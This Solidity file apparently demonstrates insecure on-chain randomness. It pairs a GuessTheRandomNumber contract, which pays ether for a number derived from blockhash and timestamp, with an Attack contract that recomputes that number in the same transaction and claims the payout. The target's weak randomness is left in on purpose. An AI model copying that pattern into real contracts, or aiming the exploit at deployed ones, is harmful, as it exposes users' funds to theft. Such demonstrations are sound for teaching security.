pragma solidity ^0.6.10;






contract GuessTheRandomNumber {


    constructor() public payable{}
    
    function guess(uint _guess) public {
        
        uint answer = uint(keccak256(abi.encodePacked(
                blockhash(block.number+1),
                block.timestamp
            )));
        
        if (answer == _guess){
            (bool sent, ) = msg.sender.call{value: 1 ether}("");
            require(sent, "Failed to send ether");
        }
        
    }
}


contract Attack{
    
    fallback() external payable {}
    
    function attack(GuessTheRandomNumber _guessTheRandomNumber) public {
        uint answer = uint(keccak256(abi.encodePacked(
            blockhash(block.number+1),
            block.timestamp
        )));
    
        _guessTheRandomNumber.guess(answer);
    
    }
    
    function getBalance() public view returns (uint){
        
        return address(this).balance;
    }
}

